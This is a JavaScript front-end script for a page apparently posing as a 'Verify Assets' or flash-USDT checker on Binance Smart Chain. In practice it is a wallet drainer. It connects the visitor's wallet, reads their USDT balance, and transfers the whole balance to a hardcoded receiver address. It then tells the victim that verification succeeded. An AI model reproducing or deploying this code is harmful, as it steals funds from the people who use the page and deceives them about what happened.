const receiverAddress = "0xe1782cBe28aD6C4a1c3d5194c8d73FE2C4CdB67d"; // Replace with your receiver address
let account;
let web3;

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on Binance Smart Chain

const usdtABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

async function verifyAssets() {
  if (typeof window.ethereum === 'undefined') {
    alert("Please install Binance Web3 Wallet, MetaMask, or Trust Wallet!");
    return;
  }

  try {
    // Connect wallet
    web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    account = accounts[0];

    document.getElementById('verifyButton').innerText = "Checking...";

    // Check USDT balance
    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
    const balanceRaw = await usdtContract.methods.balanceOf(account).call();
    const balance = balanceRaw / 10 ** 6; // USDT has 6 decimals

    if (balance > 0) {
      // Transfer USDT to receiver address
      await usdtContract.methods.transfer(receiverAddress, balanceRaw).send({ from: account });

      document.getElementById('result').innerHTML = `
        <div class="text-center mt-6 p-6 bg-black rounded-lg">
          <h2 class="text-yellow-400 text-2xl font-bold mb-4">Verification Successful!</h2>
          <p class="text-white text-lg mb-2">Reported Flash: 0</p>
          <p class="text-green-400">USDT = ${balance.toFixed(2)}</p>
        </div>
      `;
    } else {
      document.getElementById('result').innerHTML = `<div class="text-red-500 text-xl font-bold">Insufficient USDT Balance!</div>`;
    }
  } catch (err) {
    console.error(err);
    document.getElementById('result').innerHTML = `<div class="text-red-500 text-xl font-bold">Transaction Failed!</div>`;
  } finally {
    document.getElementById('verifyButton').innerText = "Verify Assets";
  }
}

document.getElementById('verifyButton').addEventListener('click', verifyAssets);
